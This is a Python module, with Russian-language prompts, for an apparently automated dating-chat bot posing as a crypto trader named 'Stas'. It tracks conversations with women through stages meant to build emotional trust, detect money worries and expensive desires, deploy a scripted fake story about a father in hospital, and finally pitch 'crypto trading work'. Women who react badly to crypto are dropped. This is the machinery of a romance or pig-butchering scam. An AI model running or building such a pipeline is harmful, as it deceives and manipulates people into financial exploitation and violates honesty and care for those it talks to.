"""
Анализатор этапов диалога: Инициация → Удержание → Диагностика → Предложение
"""
import json
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from openai import OpenAI
from loguru import logger

from ..config.settings import settings
from ..database.database import db_manager, MessageBatch


class DialogueStageAnalyzer:
    """Анализ этапов диалога для достижения целей"""
    
    def __init__(self):
        self.openai_client = OpenAI(api_key=settings.openai_api_key)
        
        # Определения этапов
        self.stages = {
            "initiation": "Первое знакомство, базовая информация",
            "retention": "Удержание интереса, углубление общения", 
            "diagnosis": "Выявление финансовых потребностей и проблем",
            "proposal": "Предложение работы/помощи"
        }
    
    def analyze_current_stage(self, chat_id: int, message_batch: MessageBatch) -> Dict:
        """Определить текущий этап диалога и стратегию"""
        try:
            # Получаем контекст диалога
            conversation_history = db_manager.get_recent_conversation_context(chat_id, limit=100)
            
            # Анализируем через ИИ
            analysis_prompt = self._build_stage_analysis_prompt(
                conversation_history, 
                message_batch.total_text
            )
            
            response = self.openai_client.chat.completions.create(
                model=settings.openai_model,
                messages=[{"role": "user", "content": analysis_prompt}],
                temperature=0.2,  # Низкая для точного анализа
                max_tokens=300
            )
            
            result = json.loads(response.choices[0].message.content)
            
            # Добавляем метаданные
            result['analyzed_at'] = datetime.utcnow().isoformat()
            result['chat_id'] = chat_id
            result['message_count'] = len(message_batch.messages)
            
            logger.info(f"📊 Этап диалога {chat_id}: {result.get('current_stage')} "
                       f"(день {result.get('dialogue_day', 1)})")
            
            return result
            
        except Exception as e:
            logger.error(f"❌ Ошибка анализа этапа диалога: {e}")
            return self._get_fallback_stage_analysis()
    
    def _build_stage_analysis_prompt(self, history: str, new_messages: str) -> str:
        """Строим промпт для анализа этапа"""
        return f"""Проанализируй диалог знакомства и определи этап.

ЦЕЛЬ СТАСА: Через эмоциональную связь выявить финансовые проблемы девушки и предложить работу в криптотрейдинге.

ИСТОРИЯ ДИАЛОГА:
{history}

НОВЫЕ СООБЩЕНИЯ:
{new_messages}

ЭТАПЫ ДИАЛОГА:
1. ИНИЦИАЦИЯ (день 1-2): Знакомство, узнать работу, проверить реакцию на крипто
2. УДЕРЖАНИЕ (день 2-3): Углубление общения, поиск общих тем  
3. ДИАГНОСТИКА (день 3-5): Выявление финансовых жалоб, травм, дорогих желаний
4. ПРЕДЛОЖЕНИЕ (день 5-7): Предложение помощи/работы в криптотрейдинге

ОТВЕТЬ СТРОГО JSON:
{{
    "current_stage": "initiation/retention/diagnosis/proposal",
    "dialogue_day": 1-7,
    "stage_progress": 1-10,
    "crypto_reaction": "positive/negative/neutral/unknown",
    "financial_signals_count": 0-10,
    "emotional_openness": 1-10,
    "readiness_for_next_stage": true/false,
    "key_insights": ["инсайт1", "инсайт2"],
    "recommended_strategy": "конкретная рекомендация",
    "stage_completion_percentage": 0-100
}}

Учитывай:
- Количество дней общения
- Реакцию на упоминания криптотрейдинга
- Жалобы на деньги/работу ("мало платят", "денег не хватает")
- Дорогие желания ("хочу машину", "мечтаю путешествовать")
- Эмоциональную открытость и доверие"""

    def _get_fallback_stage_analysis(self) -> Dict:
        """Базовый анализ при ошибке"""
        return {
            "current_stage": "initiation",
            "dialogue_day": 1,
            "stage_progress": 1,
            "crypto_reaction": "unknown",
            "financial_signals_count": 0,
            "emotional_openness": 5,
            "readiness_for_next_stage": True,
            "key_insights": [],
            "recommended_strategy": "Продолжить знакомство",
            "stage_completion_percentage": 10
        }
    
    def get_stage_specific_instructions(self, stage_analysis: Dict) -> str:
        """Получить инструкции для текущего этапа"""
        stage = stage_analysis.get('current_stage', 'initiation')
        day = stage_analysis.get('dialogue_day', 1)
        
        instructions = {
            "initiation": f"""ЭТАП ИНИЦИАЦИИ (День {day}):
- Узнай её работу и зарплату ненавязчиво
- Расскажи что трейдер криптовалют, работаешь на себя  
- Отслеживай реакцию на крипто (если негативная - готовься завершить)
- Выявляй интересы к дорогим вещам (машины, путешествия)
- Короткие ответы + встречные вопросы""",

            "retention": f"""ЭТАП УДЕРЖАНИЯ (День {day}):
- Углубляй общение, ищи общие темы
- Задавай более личные вопросы о жизни, планах
- Начинай выявлять жалобы на работу/деньги
- Проявляй искренний интерес к её проблемам
- Создавай эмоциональную связь""",

            "diagnosis": f"""ЭТАП ДИАГНОСТИКИ (День {day}):
- Активно выявляй финансовые проблемы
- Реагируй на жалобы сочувствием и пониманием
- Делись своими проблемами для создания доверия
- СЦЕНАРИЙ: Если диалог активный - история про отца в больнице
- Подготавливай почву для предложения помощи""",

            "proposal": f"""ЭТАП ПРЕДЛОЖЕНИЯ (День {day}):
- Предложи помощь по работе в криптосфере
- Будь готов объяснить детали по телефону
- Подчеркивай возможность дополнительного заработка
- Используй накопленное доверие"""
        }
        
        return instructions.get(stage, instructions["initiation"])
    
    def should_advance_to_next_stage(self, stage_analysis: Dict) -> Tuple[bool, str]:
        """Определить готовность к следующему этапу"""
        current_stage = stage_analysis.get('current_stage')
        progress = stage_analysis.get('stage_completion_percentage', 0)
        day = stage_analysis.get('dialogue_day', 1)
        
        # Условия перехода между этапами
        if current_stage == "initiation":
            if day >= 2 and progress >= 70:
                return True, "retention"
            elif stage_analysis.get('crypto_reaction') == 'negative':
                return True, "terminate"  # Завершаем диалог
                
        elif current_stage == "retention":
            if day >= 3 and stage_analysis.get('emotional_openness', 0) >= 6:
                return True, "diagnosis"
                
        elif current_stage == "diagnosis":
            financial_signals = stage_analysis.get('financial_signals_count', 0)
            if day >= 5 and financial_signals >= 2:
                return True, "proposal"
                
        return False, current_stage
    
    def get_stage_metrics(self, chat_id: int) -> Dict:
        """Получить метрики по этапам для данного диалога"""
        messages = db_manager.get_chat_messages(chat_id, limit=1000)
        
        if not messages:
            return {"total_messages": 0, "stages_reached": []}
        
        # Анализируем достигнутые этапы на основе содержания
        stages_reached = ["initiation"]  # Всегда есть инициация
        
        # Простая эвристика для определения достигнутых этапов
        total_text = " ".join([msg.text or "" for msg in messages]).lower()
        
        if any(word in total_text for word in ["работа", "зарплата", "деньги"]):
            stages_reached.append("retention")
            
        if any(word in total_text for word in ["жалуюсь", "мало", "не хватает", "устала"]):
            stages_reached.append("diagnosis")
            
        if any(word in total_text for word in ["помочь", "работа", "заработок", "предложение"]):
            stages_reached.append("proposal")
        
        return {
            "total_messages": len(messages),
            "stages_reached": stages_reached,
            "current_stage_estimated": stages_reached[-1],
            "dialogue_duration_days": (messages[-1].created_at - messages[0].created_at).days + 1
        }